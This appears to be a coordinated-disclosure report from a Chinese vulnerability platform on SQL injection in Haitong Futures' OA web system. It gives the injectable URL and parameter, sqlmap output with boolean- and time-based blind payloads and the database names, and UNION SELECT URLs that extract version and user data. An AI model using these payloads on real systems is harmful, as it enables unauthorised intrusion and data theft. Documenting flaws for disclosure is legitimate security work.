wybug_title: 海通期货某站SQL注入打包
wybug_detail:
漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-16：	厂商已经确认，细节仅向厂商公开									2015-12-26：	细节向核心白帽子及相关领域专家公开									2016-01-05：	细节向普通白帽子公开									2016-01-15：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述：  详细说明：  目标站点：海通期货oa系统。http://oa.htfutures.com/login/login.jsp注入点：http://oa.htfutures.com/web/broswer/CustomerTypeBrowser.jsp?sqlwhere=where 1=1
sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://oa.htfutures.com:80/web/broswer/CustomerTypeBrowser.jsp?sqlwhere=where 1=1 AND 9669=9669    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://oa.htfutures.com:80/web/broswer/CustomerTypeBrowser.jsp?sqlwhere=where 1=1 WAITFOR DELAY '0:0:5'---web application technology: JSPback-end DBMS: Microsoft SQL Server 2005current database:    'ecology_htqh'current user is DBA:    Falseavailable databases [6]:[*] ecology[*] ecology_htqh[*] master[*] model[*] msdb[*] tempdb

http://oa.htfutures.com/web/broswer/CustomerTypeBrowser.jsp?sqlwhere=where%201=2%20union%20all%20select%201,user,@@version,4,5,6http://oa.htfutures.com/web/broswer/ContacterTitleBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,@@version,3,4,5,6http://oa.htfutures.com/web/broswer/ContacterTitleBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,@@version,3,4,5,6
